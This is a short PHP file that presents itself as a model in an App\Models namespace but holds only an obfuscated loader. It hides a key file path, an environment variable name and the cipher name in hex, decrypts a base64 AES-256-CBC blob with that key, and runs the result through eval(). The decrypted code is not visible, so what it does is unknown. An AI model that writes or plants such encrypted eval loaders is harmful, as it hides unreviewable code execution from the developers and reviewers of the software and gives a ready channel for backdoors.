<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('UaMjJ4T9Gi5MZER07f1FFA==');

$c=base64_decode(

'cRGLfZcRgqe7z/Z4gONJs1eRPlGH/xC6Qha/mxP4ni1lDMXj5Hp9WM+H3BNwGLU4iDbBvHLw5Qn4' .
'JynJX9oO+NHwpvFYkTKStf3Go/HkOlNobQ/c1oKrrOOe2mQpYC2AHGicZ/f5UfOiceOxxP17Z5Ka' .
'z/Mkwn8DtC1hinADSuLz5FwrjbYzNVnafGUQ+5xbR3udihAYdGBArPN9yvWHqfCIM64v4dz1NN+A' .
'6a0Woq5I2hsMkYyDoWxX85gm+Nr9+iKnPtCMSW5CsFzrk6o/wHF78sG+Mb9l2GTFcOuSrh0zvZz7' .
'gnpEd8eFfCs3VZVebkcl02mRNfVrDy0yxxWx/8S8eK+RT4orLeqVNBO4G9MNdbXb/WcvQbP1GPJC' .
'yN4a2gBDgP/5E8dadOa1fBcDW2k582Bt09UPyT03vGOfE0hTJwDaeQfu3D7zR6OZDXNggdvBbcbw' .
'0FxQ/9zQ7h19uSyDgOKoxYqcVnN3tYfo55C902Z1nywWe91VHgUNosAqNC5XbxxDsJHmrRIbVcEc' .
'bdMWKv+9hhdy9OeilYuo9agLOWClZwFbeOZ5JY4gLjuBtFRYRVpXMQtzYDQCesuRWdyp5OLQst/G' .
'rCKOCHl2UHlmiqUAS7nK2uOF5g0hLdpEapOA2/8L8Nebz2uoCTJZTK1gV+M42oE6QspfGgCqX9Uz' .
'pc9qzaqXjYF6X4gfZ+MjdjUYEwmFbjCw3/34MAzx08s3+Zo/H9sx+dXL3ykXxhqghQdijd05hzmt' .
'/7zDIsEFOtilsIN/LHHpkxeT+9Qqzg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

